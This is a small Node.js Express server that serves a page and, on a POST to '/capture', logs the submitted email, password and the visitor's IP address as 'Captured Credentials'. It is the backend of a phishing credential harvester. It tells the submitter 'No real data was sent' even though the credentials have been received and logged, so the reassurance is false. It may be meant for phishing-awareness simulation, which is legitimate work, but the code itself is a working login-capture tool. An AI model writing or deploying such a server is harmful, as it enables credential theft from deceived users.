const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});


app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`Captured Credentials: Email - ${email}, Password - ${password}, IP - ${userIP}`);
    res.send('Simulation complete. No real data was sent.');
});


app.listen(3000, () => console.log('Server running on http://localhost:3000'));
